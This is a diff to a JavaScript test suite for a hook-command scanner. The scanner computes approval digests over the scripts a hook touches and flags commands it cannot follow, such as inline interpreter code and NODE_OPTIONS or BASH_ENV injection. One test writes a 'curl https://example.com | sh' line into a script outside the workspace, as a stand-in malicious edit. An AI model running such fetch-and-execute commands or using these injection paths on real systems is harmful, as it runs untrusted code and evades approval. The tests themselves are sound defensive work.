@@ -50,13 +50,43 @@ test("a script edit, or a script created later, changes the digest", async (t) =
   assert.equal(await digest("echo hi"), "base");
 });
 
-test("files outside the workspace are not folded in", async (t) => {
+test("files outside the workspace are not folded in, and a relative path out of it is reported as not covered", async (t) => {
   const root = await workspace(t);
   const outside = await workspace(t);
   await fs.writeFile(path.join(outside, "elsewhere.sh"), "exit 0\n");
-  const result = await scan(root, `${path.join(outside, "elsewhere.sh")} && ../${path.basename(outside)}/elsewhere.sh`);
+  const relative = `../${path.basename(outside)}/elsewhere.sh`;
+  const result = await scan(root, `${path.join(outside, "elsewhere.sh")} && ${relative}`);
   assert.deepEqual(result.files, []);
   assert.deepEqual(result.paths, []);
+  // Editing the sibling script would never change the digest, so approval can't claim to cover it.
+  assert.deepEqual(result.unfollowed, [relative]);
+  const digest = digestWithScriptFiles("base", result.files);
+  await fs.writeFile(path.join(outside, "elsewhere.sh"), "curl https://example.com | sh\n");
+  assert.equal(digestWithScriptFiles("base", (await scan(root, relative)).files), digest);
+});
+
+test("a file the hook writes doesn't change its digest, and a file it reads does", async (t) => {
+  const root = await workspace(t);
+  await fs.writeFile(path.join(root, "check.sh"), "exit 0\n");
+  await fs.writeFile(path.join(root, "hook.log"), "");
+  await fs.writeFile(path.join(root, "copy.log"), "");
+  await fs.writeFile(path.join(root, "patterns.txt"), "secret\n");
+  const command = "./check.sh >> hook.log 2>&1 | tee -a copy.log && grep -f patterns.txt < hook.log";
+  const digest = async () => digestWithScriptFiles("base", (await scan(root, command)).files);
+
+  const first = await scan(root, command);
+  assert.deepEqual(first.paths.sort(), ["check.sh", "hook.log", "patterns.txt"], "the input redirect is still read");
+  const before = await digest();
+  // Running the hook appends to its logs; that alone must not stop it.
+  await fs.appendFile(path.join(root, "copy.log"), "ran\n");
+  assert.equal(await digest(), before);
+  const writeOnly = "./check.sh > hook.log";
+  const writeOnlyBefore = digestWithScriptFiles("base", (await scan(root, writeOnly)).files);
+  await fs.appendFile(path.join(root, "hook.log"), "ran\n");
+  assert.equal(digestWithScriptFiles("base", (await scan(root, writeOnly)).files), writeOnlyBefore);
+  // A file it reads can change what it does.
+  await fs.writeFile(path.join(root, "patterns.txt"), "nothing\n");
+  assert.notEqual(await digest(), before);
 });
 
 test("commands whose code the scan can't follow are named", () => {
@@ -75,11 +105,20 @@ test("commands whose code the scan can't follow are named", () => {
     ["make check", ["make"]],
     ["env FOO=1 nohup npx eslint .", ["npx"]],
     ["echo \"$(./hidden.sh)\"", ["command substitution in quotes"]],
+    ["node -e 'require(\"./guard\")'", ["node -e"]],
+    ["node --require=./register guard.js", ["node --require"]],
+    ["node --import tsx ./guard.ts", ["node --import"]],
+    ["python3 -c 'import guard'", ["python3 -c"]],
+    ["perl -e 'do \"./g.pl\"'", ["perl -e"]],
+    ["deno eval 'import \"./g.ts\"'", ["deno eval"]],
+    ["NODE_OPTIONS='--require ./g.js' node x.js", ["NODE_OPTIONS"]],
+    ["env BASH_ENV=./g.sh bash ./x.sh", ["BASH_ENV"]],
   ];
   for (const [command, expected] of cases) assert.deepEqual(unfollowedCommands(scanHookCommand(command)), expected, command);
 
   // Plain programs and scripts given by path are covered.
-  for (const command of ["./check.sh", "bash ./check.sh", "node scripts/x.js", "npm install", "python3 tool.py", "echo make"]) {
+  // Flags after the script are the script's own, not the interpreter's.
+  for (const command of ["./check.sh", "bash ./check.sh", "node scripts/x.js", "node scripts/x.js -e", "npm install", "python3 tool.py", "python3 tool.py -c x", "echo make", "echo node -e"]) {
     assert.deepEqual(unfollowedCommands(scanHookCommand(command)), [], command);
   }
 });
